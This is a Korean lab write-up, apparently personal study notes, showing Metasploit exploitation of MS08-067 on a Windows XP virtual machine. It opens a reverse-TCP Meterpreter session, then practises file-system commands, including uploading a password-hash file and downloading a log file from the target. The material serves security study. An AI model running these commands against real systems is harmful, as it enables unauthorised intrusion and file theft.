# 실습 준비
**msfconsole**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EC%8B%A4%EC%8A%B5%EC%9D%84%20%EC%9C%84%ED%95%9C%20msfconsole.png)  
**search ms08-067**  
**use exploit/windows/smb/ms08_067_netapi**  
**set payload windows/meterpreter/reverse_tcp_allports**  
**show options**  
**set RHOST (Window Xp의 IP)**  
**set LHOST (Kali IP)**  
**run**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/WindowXp%EA%B3%B5%EA%B2%A9%EC%9D%84%20%EC%9C%84%ED%95%9C%20%EC%84%A4%EC%A0%95.png)  

이렇게 WindowXp의 취약점인 Ms08-067을 통해 meterpreter 세션이 열렸다면 이제부터 Stdapi를 실습해 볼 것입니다.  

### 실습  

**pwd**  
타겟 시스템의 현재 디렉토리 출력  
**lpwd**  
로컬 시스템의 현재 디렉토리 출력  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B51.png)  

**cd ..**  
디렉토리 이동  
**pwd**  
디렉토리의 위치 표기  
**ls**  
현재 디렉토리에 있는 모든 파일 표기  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B52.png)  

**mkdir newDir**  
디렉토리 생성  
**ls**  
#### Kali Linux에서 확인
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B53%20%EB%94%94%EB%A0%89%ED%86%A0%EB%A6%AC%20%EC%83%9D%EC%84%B1(Kali%EC%97%90%EC%84%9C%20%ED%99%95%EC%9D%B8).png)

#### Window Xp에서 확인
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B53%20%EB%94%94%EB%A0%89%ED%86%A0%EB%A6%AC%20%EC%83%9D%EC%84%B1(Xp%EC%97%90%EC%84%9C%20%ED%99%95%EC%9D%B8).png)  

위의 사진을 보다 싶이 정상적으로 폴더가 생성된 것을 볼 수 있다.

**cd newDir**  
**pwd**  
**upload /home/kali/Desktop/WinXpHash.txt "c:\WINDOWS\\newDir"**  
Kali에 저장되어있는 WindowXp의 PasswordHash값을 WindowXp의 newDir에 업로드  
**ls**  
**cat WinXpHash.txt**  
WinXpHash.txt 파일의 내용을 화면에 출력  

#### Kali Linux에서 확인
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B54(%EC%97%85%EB%A1%9C%EB%93%9C%20Kali%EC%97%90%EC%84%9C%20%ED%99%95%EC%9D%B8).png)  

#### Window Xp에서 확인
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B54(%EC%97%85%EB%A1%9C%EB%93%9C%20Xp%EC%97%90%EC%84%9C%20%ED%99%95%EC%9D%B8).png)  

이번에는 Window Xp에서 Kali로 파일을 다운로드 해볼 것이다.  
이번에 다운로드해볼 파일은 C:\\WINDOW에 있는 log파일  하나를 가져와 볼 것이다.  
**cd ..**  
**download "c:\WINDOWS\\0.log" /home/kali/Desktop**  
0.log파일을 Kali Linux에 다운로드  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B55(%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C).png)  
이렇게 사진을 확인해보면 바탕화면에 잘 다운로드 된 것을 알 수 있다.  

이제는 현재 생성한 디렉토리(폴더)를 삭제 해볼 것이다.  
**pwd**  
**rmdir newDir**  
newdir을 삭제.

#### Kali Linux에서 확인
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B56(%EC%82%AD%EC%A0%9C).png)  
현재 사진에는 보이지 않으나 WindowXp에서 Hash값을 저장한 txt파일에 접근 중인것을 까먹고 디렉토리 삭제 명령을 보내 오류가 발생했다.  
이는 가장 기본적인 실수로 삭제하려는 디렉토리(폴더)에 파일 시스템이나 다른 사람이 접근 중이라면 삭제하거나 변경하는 것이 불가능하다.  

#### Window Xp에서 확인
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/StdAPI/File%20System/Source/%EB%AA%85%EB%A0%B9%EC%96%B4%20%EC%8B%A4%EC%8A%B56(%EC%82%AD%EC%A0%9C).png)  
이렇게 WindowXp에서 디렉토리(폴더)가 사라진것을 볼 수 있다.  
